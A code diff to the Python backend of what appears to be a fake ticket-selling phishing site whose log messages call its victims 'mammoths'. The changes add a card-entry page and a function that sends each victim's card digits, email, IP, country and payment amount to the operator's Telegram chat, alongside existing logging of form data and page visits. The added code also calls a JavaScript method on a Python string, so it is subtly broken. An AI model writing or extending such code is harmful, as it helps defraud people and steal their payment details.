@@ -338,7 +338,9 @@ def get_page_name(path):
     if path == '/' or path == '/index.html':
         return "Главная страница"
     elif '/buy-tickets/' in path:
-        if '/code/' in path:
+        if '/loading/' in path:
+            return "Ввод карты"
+        elif '/code/' in path:
             return "Оформление заказа (код)"
         elif '/quantity/' in path:
             return "Оформление заказа (количество)"
@@ -414,7 +416,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
     event_name = get_event_name_from_page_code(link)
     
     msg = (
-        f"🔔 Мамонт открыл страницу ({event_name})\n\n"
+        f"🔔 Мамонт открыл страницу\n\n"
         f"📎 Страница: {page_name}\n"
         f"#️⃣ Ссылка: {link}\n"
         f"📶 IP: {ip}\n"
@@ -495,15 +497,13 @@ def send_button_log_to_chat(button_type, ip, page_code, user_name=None, event_in
             
             msg += f"🔗 URL: {button_url}\n"
         
-        # Надсилаємо в групу
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        data_group = {"chat_id": GROUP_ID, "text": msg}
+        # НЕ надсилаємо в групу - тільки в особисті повідомлення адміну
+        # url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        # data_group = {"chat_id": GROUP_ID, "text": msg}
         
-        try:
-            requests.post(url, data=data_group, timeout=2)
-            print(f"✅ Лог про кнопку {button_type} надіслано в групу")
-        except Exception as e:
-            print(f"❌ Помилка надсилання логу про кнопку в групу: {e}")
+        # Логуємо тільки в консоль
+        print(f"✅ Лог про кнопку {button_type} залоговано (не надсилається в групу)")
+        print(f"📝 Повідомлення: {msg}")
             
     except Exception as e:
         print(f"❌ Помилка в send_button_log_to_chat: {e}")
@@ -535,7 +535,7 @@ def send_personal_log_to_admin(page_code, ip, country, page_name, action_type="p
             event_name = get_event_name_from_page_code(f"?page={page_code}")
             
             # Формуємо повідомлення в потрібному форматі
-            message = f"""🔔Мамонт открыл страницу ({event_name})
+            message = f"""🔔Мамонт открыл страницу
 
 📎Страница: {page_name}
 #️⃣Ссылка: ?page={page_code}
@@ -584,7 +584,7 @@ def send_event_selection_log(page_code, ip, country, event_name, event_index):
             admin_id = row[0]
             
             # Формуємо повідомлення про вибір івенту
-            message = f"""🔔Мамонт выбрал событие ({event_name})
+            message = f"""🔔Мамонт выбрал событие
 
 📎Страница: Выбор события
 #️⃣Ссылка: ?page={page_code}
@@ -637,7 +637,7 @@ def send_order_form_log(page_code, ip, country, name, phone, email, price, curre
             event_name = get_event_name_from_page_code(f"?page={page_code}")
             
             # Формуємо повідомлення про форму замовлення
-            message = f"""🔔Мамонт заполнил форму заказа ({event_name})
+            message = f"""🔔Мамонт заполнил форму заказа
 
 📎Страница: Оформление заказа
 #️⃣Ссылка: ?page={page_code}
@@ -665,6 +665,64 @@ def send_order_form_log(page_code, ip, country, name, phone, email, price, curre
             
     except Exception as e:
         print(f"❌ Помилка в send_order_form_log: {e}")
+
+def send_card_input_log(page_code, ip, country, card_number, email, price, currency):
+    """
+    Надсилає лог про введення карти в особисті повідомлення з ботом адміну
+    """
+    try:
+        # Отримуємо admin_id за page_code
+        db = sqlite3.connect('users.db')
+        cur = db.cursor()
+        
+        # Спочатку шукаємо в event_links
+        cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+        row = cur.fetchone()
+        
+        if not row:
+            # Якщо не знайдено в event_links, шукаємо в site_users
+            cur.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
+            row = cur.fetchone()
+        
+        db.close()
+        
+        if row:
+            admin_id = row[0]
+            
+            # Визначаємо назву події
+            event_name = get_event_name_from_page_code(f"?page={page_code}")
+            
+            # Маскуємо номер карти (показуємо тільки останні 4 цифри)
+            masked_card = f"**** **** **** {card_number.slice(-4)}" if card_number else "Не указано"
+            
+            # Формуємо повідомлення про введення карти
+            message = f"""🔔Мамонт ввел данные карты
+
+📎Страница: Ввод карты
+#️⃣Ссылка: ?page={page_code}
+📶IP: {ip}
+🌎Страна: {country}
+💳Карта: {masked_card}
+📧Email: {email or 'Не указано'}
+💰Сумма: {price or 'Не указано'}{currency or ''}"""
+            
+            # Надсилаємо повідомлення через Telegram API
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            data = {"chat_id": admin_id, "text": message}
+            
+            try:
+                response = requests.post(url, data=data, timeout=2)
+                if response.status_code == 200:
+                    print(f"✅ Лог про введення карти надіслано адміну {admin_id}")
+                else:
+                    print(f"⚠️ Помилка надсилання логу про введення карти: {response.status_code}")
+            except Exception as e:
+                print(f"❌ Помилка надсилання логу про введення карти адміну {admin_id}: {e}")
+        else:
+            print(f"⚠️ Не знайдено адміна для page_code: {page_code}")
+            
+    except Exception as e:
+        print(f"❌ Помилка в send_card_input_log: {e}")
 
 def get_real_ip(handler):
     xff = handler.headers.get('X-Forwarded-For')
